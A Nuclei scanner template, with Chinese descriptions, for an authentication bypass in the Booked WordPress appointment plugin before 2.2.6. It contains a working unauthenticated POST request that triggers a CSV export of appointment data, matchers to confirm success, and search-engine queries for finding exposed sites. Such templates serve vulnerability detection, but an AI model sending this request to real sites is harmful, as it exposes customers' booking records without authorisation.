id: booked-export-csv

info:
  name: Booked < 2.2.6 - 认证缺陷漏洞
  author: random-robbie
  severity: high
  description: Booked < 2.2.6 - Broken Authentication 存在未授权访问或认证绕过问题。攻击者无需有效凭证即可访问敏感接口、执行高权限操作或进一步扩大影响。
  remediation: |
    - 按厂商公告升级到已修复版本；原始说明中提到的版本信息为：Fixed in version 2。
    - 根据厂商安全公告或补丁说明升级到最新安全版本。
    - 结合访问控制、日志审计和暴露面收敛，降低相同问题再次被利用的风险。
  reference:
    - https://codecanyon.net/item/booked-appointments-appointment-booking-for-wordpress/9466968
    - http://boxyupdates.com/changelog.php?p=booked
    - https://wpscan.com/vulnerability/10107
  classification:
    cpe: cpe:2.3:a:twinkletoessoftware:booked:*:*:*:*:*:*:*:*
  metadata:
    verified: true
    max-request: 1
    vendor: twinkletoessoftware
    product: booked
    fofa-query: "wp-content/plugins/booked/"
    publicwww-query: "/wp-content/plugins/booked/"
    google-query: inurl:"/wp-content/plugins/booked/"
  tags: wordpress,wpscan,wp-plugin,wp,booked,bypass,vuln

http:
  - raw:
      - |
        POST /wp-admin/admin-post.php HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/x-www-form-urlencoded; charset=UTF-8

        booked_export_appointments_csv=

    matchers-condition: and
    matchers:
      - type: word
        part: body
        words:
          - "End Time"
          - "Start Time"
          - "Calendar"
        condition: and

      - type: word
        part: header
        words:
          - text/csv

      - type: status
        status:
          - 200
